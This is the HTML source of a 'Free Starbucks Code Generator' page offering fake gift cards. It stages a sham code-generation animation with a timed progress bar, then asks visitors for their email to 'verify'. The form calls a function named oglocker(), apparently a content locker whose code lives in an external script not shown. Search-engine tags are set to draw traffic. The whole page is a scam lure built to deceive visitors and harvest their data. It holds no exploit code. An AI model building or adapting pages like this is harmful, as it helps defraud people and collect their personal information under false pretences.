<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Starbucks Code Generator | Get Starbucks for Free</title>
  <meta name="description" content="Get free Starbucks gift cards and enjoy your favorite coffee beverages and snacks at Starbucks. Use our Starbucks gift card generator to redeem rewards and save on your Starbucks purchases.">
  <meta name="keywords" content="free Starbucks gift cards, Starbucks gift card generator, Starbucks rewards, Starbucks promo codes, coffee gift cards, free coffee, Starbucks coffee">

  <meta name="robots" content="index, follow">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    @font-face {
      font-family: 'Blanka';
      src: url('./fonts/blanka-free-font-er/Blanka Font/Blanka-Regular.otf') format('woff2'); /* Older Browsers */
      font-weight: normal;
      font-style: normal;
    }
    .blanka-font {
      font-family: 'Blanka', sans-serif; /* Use Blanka font or fallback to sans-serif */
    }
    .heading{
      text-shadow:0 0 10px rgba(255, 255, 255, 0.697);
    }
    #pricedcards img:hover{
      transition: 0.5s;
      transform: scale(1.05);
      box-shadow: 0px 0px 8px rgb(213, 213, 213);
      cursor:pointer;
    }
    @keyframes load {
      0% { width: 0; }
      10% { width: 10; }
      20% { width: 20; }
      30% { width: 30; }
      40% { width: 40; }
      60% { width: 60; }
      100% { width: 100%; }
    }
    body{
      background: url('./img/starbucksBg.png') center/cover;
    }
  </style>
</head>
<body id="body" data-source="starbuckspage" class="">
  <h1 id="heading" class="text-white heading text-3xl md:text-4xl lg:text-3xl font-semibold text-center py-8 bg-gray-900 opacity-90 p-4 mt-0 blanka-font z-10">Get Free Gift Cards!</h1>
  
  <div id="pricedcards" class="min-h-screen grid grid-cols-1 place-items-center sm:grid-cols-2 md:grid-cols-3 gap-4 py-10 lg:px-64 md:px-10 px-20 flex-wrap animate__animated">
      <img id="starbucks50" data-custom-value="starbucks50" src="./img/starbucks/2.png" alt="starbucks $50 Gift Card" class="rounded-lg shadow-lg animate__animated animate__slideInRight">
      <img id="starbucks100" data-custom-value="starbucks100" src="./img/starbucks/3.png" alt="starbucks $100 Gift Card" class="rounded-lg shadow-lg animate__animated animate__slideInRight">
      <img id="starbucks250" data-custom-value="starbucks250" src="./img/starbucks/4.png" alt="starbucks $250 Gift Card" class="rounded-lg shadow-lg animate__animated animate__slideInRight">
  </div>


  <!-- generating code div -->
  <div id="codegeneration" class="h-screen flex flex-col hidden pt-20 items-center text-center bg-gray-800 opacity-80">
    <div id="codegenelements" class=" flex flex-col justify-center items-center text-center animate__animated animate__infinite">
      <p class="text-3xl md:text-3xl lg:text-3xl xl:text-4xl pb-10 text-white md:w-full md:px-30" id="price"></p>
      <img class="w-20 md:w-24 lg:w-32 xl:w-40 hover:scale-105 animate-spin slower" src="./img/webImg/gear-animation.png" alt="Loading Gear">
    </div>

    <div id="progressbar" class="progress bg-gray-800 h-5 md:h-5 lg:h-5 xl:h-5 lg:w-96 md:w-96 w-60 my-10 max-w-screen-lg rounded-full overflow-hidden relative">
      <div class="progress-outline absolute inset-0 border-2 border-white rounded-full"></div>
      <div class="progress-value bg-white h-full" style="animation: load 3s normal forwards;"></div>
    </div>

    <div>
      <p id="generatedcode" class="text-3xl md:text-3xl lg:text-3xl xl:text-4xl mb-6 text-white mt-10 bg-gray-500 px-10 py-1 rounded-full"></p>
    </div>

    <form id="verifybutton" action="javascript:void(0);" onsubmit="oglocker()" class="bg-black rounded-lg w-full px-10 py-5 md:w-96">
      <p class="text-center text-white text-2xl">Enter your email to receive your gift card</p>
      <input required type="email" name="email" id="email" placeholder="Your E-mail" class="py-2 rounded-lg w-full mb-2 px-1 mt-2"><br>
      <button data-custom-value="amazonverify" class="bg-blue-700 text-black border rounded-lg py-2 w-full text-white">Verify</button>
    </form>

  </div>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap">
</body>
<script src="./js/loadingallcards.js"></script>
</html>
